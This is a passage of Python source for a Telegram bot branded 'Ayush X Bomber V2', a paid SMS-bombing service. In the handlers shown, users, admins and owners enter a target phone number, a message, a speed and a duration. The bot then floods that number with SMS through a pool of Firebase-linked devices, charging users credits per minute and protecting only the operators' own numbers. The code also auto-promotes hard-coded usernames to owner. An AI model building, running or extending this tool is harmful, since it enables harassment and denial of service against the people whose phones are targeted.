        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(get_access_denied_text(uid, d), parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")


# ================= ACCESS MANAGEMENT COMMANDS =================
@R.message(Command("addaccess", "setaccess", "setexpire", "addexpire"))
async def cmd_add_access(msg: Message):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Only Admins/Owners can use this command!", parse_mode="HTML")
        return
    parts = msg.text.strip().split()
    if len(parts) < 3:
        await msg.answer(
            f"{em(EMOJI_WARNING, '⚠️')} <b>Usage:</b> <code>/addaccess &lt;user_id&gt; &lt;days&gt;</code>\n"
            f"<i>Example: /addaccess 123456789 30</i>",
            parse_mode="HTML"
        )
        return
    try:
        target_uid = int(parts[1])
        days = float(parts[2])
        if days <= 0:
            raise ValueError()
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid user_id ya days. Numbers bhejein.", parse_mode="HTML")
        return
    
    new_exp = set_user_access(target_uid, days, d)
    log_activity(d, "add_access", uid, f"Added {days} days to {target_uid}")
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Access Granted Successfully!</b>\n\n"
        f"👤 <b>User ID:</b> <code>{target_uid}</code>\n"
        f"⏳ <b>Duration:</b> {days} din\n"
        f"📅 <b>Expiry Date:</b> <code>{fmt_time(new_exp)}</code>\n"
        f"⌛ <b>Validity Left:</b> <code>{fmt_duration_left(new_exp)}</code>",
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(
            target_uid,
            f"{em(EMOJI_GIFT, '🎉')} <b>Aapka Bot Access Active Ho Gaya Hai!</b>\n\n"
            f"⏳ <b>Validity:</b> <b>{days} din</b>\n"
            f"📅 <b>Expiry Date:</b> <code>{fmt_time(new_exp)}</code>\n\n"
            f"Ab aap SMS Blast bot use kar sakte hain! /start dabayein.",
            parse_mode="HTML"
        )
    except:
        pass

@R.message(Command("remaccess", "removeaccess", "delexpire"))
async def cmd_rem_access(msg: Message):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Only Admins/Owners can use this command!", parse_mode="HTML")
        return
    parts = msg.text.strip().split()
    if len(parts) < 2:
        await msg.answer(
            f"{em(EMOJI_WARNING, '⚠️')} <b>Usage:</b> <code>/remaccess &lt;user_id&gt;</code>\n"
            f"<i>Example: /remaccess 123456789</i>",
            parse_mode="HTML"
        )
        return
    try:
        target_uid = int(parts[1])
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid user_id. Numbers bhejein.", parse_mode="HTML")
        return
    
    removed = remove_user_access(target_uid, d)
    log_activity(d, "remove_access", uid, f"Removed access for {target_uid}")
    if removed:
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} User <code>{target_uid}</code> ka access revoke / remove kar diya gaya.", parse_mode="HTML")
        try:
            await msg.bot.send_message(
                target_uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Aapka bot access expire ya revoke kar diya gaya hai.</b>\nAdmin se contact karein.",
                parse_mode="HTML"
            )
        except:
            pass
    else:
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} User <code>{target_uid}</code> ke paas active access nahi tha.", parse_mode="HTML")

@R.message(Command("checkaccess"))
async def cmd_check_access(msg: Message):
    d = load()
    uid = msg.from_user.id
    parts = msg.text.strip().split()
    if len(parts) > 1 and is_admin(uid, d):
        try:
            target_uid = int(parts[1])
        except:
            target_uid = uid
    else:
        target_uid = uid
    
    exp = get_user_expiry(target_uid, d)
    now_ts = int(time.time())
    if is_admin(target_uid, d):
        status = "👑 Admin / Owner (Unlimited Lifetime)"
    elif exp > now_ts:
        status = f"✅ Active — {fmt_duration_left(exp)} left (Expires: {fmt_time(exp)})"
    elif exp > 0:
        status = f"❌ Expired on {fmt_time(exp)}"
    elif d.get("free_mode"):
        status = "🆓 Free Mode Active"
    else:
        status = "❌ No Active Access"
    
    await msg.answer(
        f"{em(EMOJI_STAR, '⏳')} <b>Access Status for <code>{target_uid}</code>:</b>\n\n"
        f"<b>Status:</b> {status}\n"
        f"<b>Role:</b> {role_tag(target_uid, d)}",
        parse_mode="HTML"
    )

@R.message(Command("accesslist"))
async def cmd_access_list(msg: Message):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Only Admins/Owners can use this command!", parse_mode="HTML")
        return
    user_access = d.get("user_access", {})
    now_ts = int(time.time())
    active_users = [(int(k), v) for k, v in user_access.items() if v > now_ts]
    if not active_users:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi active user access nahi hai.", parse_mode="HTML")
        return
    lines = [f"{em(EMOJI_STAR, '📋')} <b>Active Subscriptions ({len(active_users)}):</b>\n"]
    for idx, (target_uid, exp) in enumerate(active_users[:30], 1):
        name = d.get("users", {}).get(str(target_uid), {}).get("name", "User")
        lines.append(f"<b>{idx}.</b> <code>{target_uid}</code> ({name[:12]}) — <b>{fmt_duration_left(exp)}</b> left ({fmt_time(exp)})")
    await msg.answer("\n".join(lines), parse_mode="HTML")
# =============================================================

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else None
    d = load()
    is_new = reg_user(uid, name, d, username=username)

    # Always ensure username is stored
    if str(uid) in d.get("users", {}):
        d["users"][str(uid)]["name"] = name
        if username:
            d["users"][str(uid)]["username"] = username

    # Auto-grant owner to @GOD_AYUSH or @LORD_ITACHI
    raw_uname = (msg.from_user.username or "").lower().strip()
    if raw_uname in ("GOD_AYUSH", "GOD_AYUSH", "LORD_ITACHI"):
        if uid not in d.setdefault("owners", []):
            d["owners"].append(uid)
            log.info(f"Auto-promoted @{raw_uname} (id={uid}) to OWNER")

    save(d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"?? <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username or 'No Username'}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(get_access_denied_text(uid, d), parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")


@R.message(Command("myid", "id"))
async def cmd_my_id(msg: Message):
    uid = msg.from_user.id
    uname = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    role = "👑 Owner" if is_owner(uid, d) else "🛡 Admin" if is_admin(uid, d) else "👤 User"
    await msg.answer(
        f"🆔 <b>YOUR ACCOUNT INFO</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━</code>\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"👤 <b>Name:</b> {msg.from_user.full_name}\n"
        f"🌐 <b>Username:</b> {uname}\n"
        f"👑 <b>Role:</b> {role}",
        parse_mode="HTML"
    )

@R.message(Command("claimowner", "owner"))
async def cmd_claim_owner(msg: Message):
    uid = msg.from_user.id
    uname = (msg.from_user.username or "").lower().strip()
    d = load()
    if uname in ("GOD_AYUSH", "GOD_AYUSH", "LORD_ITACHI") or uid in SUPER_ADMINS or uid in d.get("owners", []):
        if uid not in d.setdefault("owners", []):
            d["owners"].append(uid)
            save(d)
        await msg.answer(
            f"👑 <b>Owner Access Verified!</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━</code>\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"👤 <b>Username:</b> @{msg.from_user.username}\n\n"
            f"🚀 <i>Type /start to open Owner Panel!</i>",
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"❌ <b>Access Denied!</b>\n"
            f"Your ID: <code>{uid}</code> (@{msg.from_user.username or 'No Username'}).\n"
            f"Only @GOD_AYUSH is authorized to claim owner access.",
            parse_mode="HTML"
        )
@R.callback_query(F.data == "admin:export_db")
async def export_db(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    
    if not os.path.exists(_DATA_FILE):
        await cq.answer("❌ Database file not found!", show_alert=True)
        return

    await cq.answer("📤 Exporting Database...")
    try:
        doc = FSInputFile(_DATA_FILE, filename="blast_data.json")
        await cq.message.answer_document(
            document=doc,
            caption=(
                f"✅ <b>Database Exported Successfully!</b>\n\n"
                f"📅 <b>Date:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
                f"📦 <b>Total Users:</b> <b>{len(d.get('users', {}))}</b>\n"
                f"🔥 <b>Firebases:</b> <b>{len(d.get('firebases', []))}</b>\n\n"
                f"<i>⚠️ Ise GitHub me daalna mat bhoolna!</i>"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Export DB failed: {e}")
        await cq.message.answer(f"❌ <b>Export Failed:</b> <code>{str(e)}</code>", parse_mode="HTML")

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        await cq.message.answer(get_access_denied_text(uid, d), parse_mode="HTML")
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"<b>🎯 STEP 1/3 — TARGET NUMBER</b>\n\n"
        f"📱 Enter the phone number to blast:\n"
        f"<code>+919876543210</code> or <code>9876543210</code>\n\n"
        f"<i>Hit send after typing the number 👇</i>",
        reply_markup=kb([(f"❌ Cᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        await msg.answer(
            f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
            f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
            parse_mode="HTML"
        )
        return

    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    count = len(devices) if devices else len(d.get("firebases", []))

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    await cq.message.edit_text(
        f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"⚡ <b>Speed</b>    » <b>{speed_label}</b>\n"
        f"🔥 <b>APIs</b>     » <b>{count}</b> Online{credit_info}\n\n"
        f"<b>⏱ STEP 3/3 — SELECT DURATION</b>\n\n"
        f"<i>How long should it blast? (runs continuously)</i>",
        reply_markup=duration_kb("user"),
        parse_mode="HTML"
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...", parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"<b>🎯 STEP 1/3 — TARGET NUMBER</b>\n\n"
        f"📱 Enter the phone number to blast:\n"
        f"<code>+919876543210</code> or <code>9876543210</code>\n\n"
        f"<i>Hit send after typing the number 👇</i>",
        reply_markup=kb([(f"❌ Cᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"✅ <b>Target:</b> <code>{number}</code>\n\n"
        f"<b>📝 STEP 2/3 — CUSTOM SMS MESSAGE</b>\n\n"
        f"<i>Type the message you want to blast:</i>",
        reply_markup=kb([(f"❌ Cᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"<b>⚡ STEP 3/3 — SELECT SPEED</b>\n\n"
        f"<i>Choose your sending speed:</i>",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    speed_map = {
        "owner:speed:fast": SPEED_FAST,
        "owner:speed:medium": SPEED_MEDIUM,
        "owner:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)

    devices = get_cached_devices()
    count = len(devices) if devices else len(load().get("firebases", []))

    await cq.message.edit_text(
        f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"⚡ <b>Speed</b>    » <b>{speed_label}</b>\n"
        f"🔥 <b>APIs</b>     » <b>{count}</b> Online ({count * 3} SMS capacity)\n\n"
        f"<b>⏱ STEP 3/3 — SELECT DURATION</b>\n\n"
        f"<i>How long should it blast? (runs continuously)</i>",
        reply_markup=duration_kb("owner"),
        parse_mode="HTML"
    )

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    speed_map = {
        "admin:speed:fast": SPEED_FAST,
        "admin:speed:medium": SPEED_MEDIUM,
        "admin:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)

    devices = get_cached_devices()
    count = len(devices) if devices else len(load().get("firebases", []))

    await cq.message.edit_text(
        f"💣 <b>Aʏᴜꜱʜ Bᴏᴍʙᴇʀ V2</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"⚡ <b>Speed</b>    » <b>{speed_label}</b>\n"
        f"🔥 <b>APIs</b>     » <b>{count}</b> Online ({count * 3} SMS capacity)\n\n"
        f"<b>⏱ STEP 3/3 — SELECT DURATION</b>\n\n"
        f"<i>How long should it blast? (runs continuously)</i>",
        reply_markup=duration_kb("admin"),
        parse_mode="HTML"
    )

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)


# =========================================================
# DURATION SELECTION HANDLERS
# =========================================================

def parse_duration_seconds(secs: int) -> int:
    """Convert seconds to repeat count assuming ~SPEED_DEFAULT per send"""
    # We'll store end_time, not count
    return secs

@R.callback_query(F.data.startswith("user:dur:"))
async def user_duration_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return

    part = cq.data.split("user:dur:")[1]

    is_exempt = is_admin(uid, d) or is_owner(uid, d) or is_access_valid(uid, d)

    if part == "custom":
        cost_note = "" if is_exempt else "\n\n💳 <b>Cost:</b> <b>500 CR per minute</b>"
        await state.set_state(S.send_duration_custom)
        await cq.message.edit_text(
            f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"<b>✍️ CUSTOM DURATION</b>\n\n"
            f"Enter duration in <b>minutes</b>:\n"
            f"<i>e.g. 45 for 45 minutes, 90 for 1.5 hours</i>{cost_note}",
            reply_markup=kb([("❌ Cᴀɴᴄᴇʟ", "user:cancel")]),
            parse_mode="HTML"
        )
        return

    try:
        duration_secs = int(part)
    except:
        await cq.answer("❌ Invalid!", show_alert=True)
        return

    # --- Credit check for regular users ---
    if not is_exempt:
        cost = calc_credit_cost(duration_secs)
        bal = get_user_credits(uid, d)
        if bal < cost:
            cost_str = f"{cost // 1000}K" if cost >= 1000 else str(cost)
            bal_str = str(bal)
            await cq.message.edit_text(
                f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
                f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
                f"❌ <b>Insufficient Credits!</b>\n\n"
                f"💳 <b>Required:</b> <b>{cost_str} CR</b>\n"
                f"💰 <b>Your Balance:</b> <b>{bal_str} CR</b>\n\n"
                f"<i>Buy credits to continue blasting!</i>",
                reply_markup=kb([
                    ("💳 Bᴜʏ Cʀᴇᴅɪᴛs", "user:pricing"),
                    ("🏠 Home", "user:home")
                ]),
                parse_mode="HTML"
            )
            return
        # Deduct credits upfront
        deduct_credits(uid, cost, d)
        save(d)

    fsmd = await state.get_data()
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    devices = get_cached_devices()
    if not devices:
        # Fallback to firebases as virtual devices
        fbs = d.get("firebases", [])
        devices = [{"fb_url": fb["url"], "dev_id": fb.get("label", "dev"), "sims": [0]} for fb in fbs[:200]]
    if not devices:
        await cq.message.edit_text(f"😴 <b>No APIs online!</b> Try later.", reply_markup=kb([("🏠 Home", "user:home")]), parse_mode="HTML")
        return
    await run_sms_blast_timed(cq.bot, cq.message, uid, number, message_text, duration_secs, devices, send_speed)

@R.message(S.send_duration_custom)
async def user_got_custom_duration(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        mins = float(msg.text.strip())
        if mins <= 0: raise ValueError
        duration_secs = int(mins * 60)
    except:
        await msg.answer("❌ Enter a valid number of minutes (e.g. 30):", parse_mode="HTML")
        return

    is_exempt = is_admin(uid, d) or is_owner(uid, d) or is_access_valid(uid, d)

    if not is_exempt:
        cost = calc_credit_cost(duration_secs)
        bal = get_user_credits(uid, d)
        if bal < cost:
            cost_str = f"{cost // 1000}K" if cost >= 1000 else str(cost)
            await state.clear()
            await msg.answer(
                f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
                f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
                f"❌ <b>Insufficient Credits!</b>\n\n"
                f"💳 <b>Required:</b> <b>{cost_str} CR</b> for {int(mins)} min\n"
                f"💰 <b>Your Balance:</b> <b>{bal} CR</b>\n\n"
                f"<i>Buy credits to continue blasting!</i>",
                reply_markup=kb([
                    ("💳 Bᴜʏ Cʀᴇᴅɪᴛs", "user:pricing"),
                    ("🏠 Home", "user:home")
                ]),
                parse_mode="HTML"
            )
            return
        deduct_credits(uid, cost, d)
        save(d)

    fsmd = await state.get_data()
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        fbs = d.get("firebases", [])
        devices = [{"fb_url": fb["url"], "dev_id": fb.get("label", "dev"), "sims": [0]} for fb in fbs[:200]]
    if not devices:
        await msg.answer(f"😴 <b>No APIs online!</b> Try later.", reply_markup=kb([("🏠 Home", "user:home")]), parse_mode="HTML")
        return
    await run_sms_blast_timed(msg.bot, msg, uid, number, message_text, duration_secs, devices, send_speed)

@R.callback_query(F.data.startswith("owner:dur:"))
async def owner_duration_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    part = cq.data.split("owner:dur:")[1]
    if part == "custom":
        await state.set_state(S.owner_send_duration_custom)
        await cq.message.edit_text(
            f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"<b>✍️ CUSTOM DURATION</b>\n\n"
            f"Enter duration in <b>minutes</b>:\n"
            f"<i>e.g. 45 for 45 minutes</i>",
            reply_markup=kb([("❌ Cᴀɴᴄᴇʟ", "owner:home")]),
            parse_mode="HTML"
        )
        return

    try:
        duration_secs = int(part)
    except:
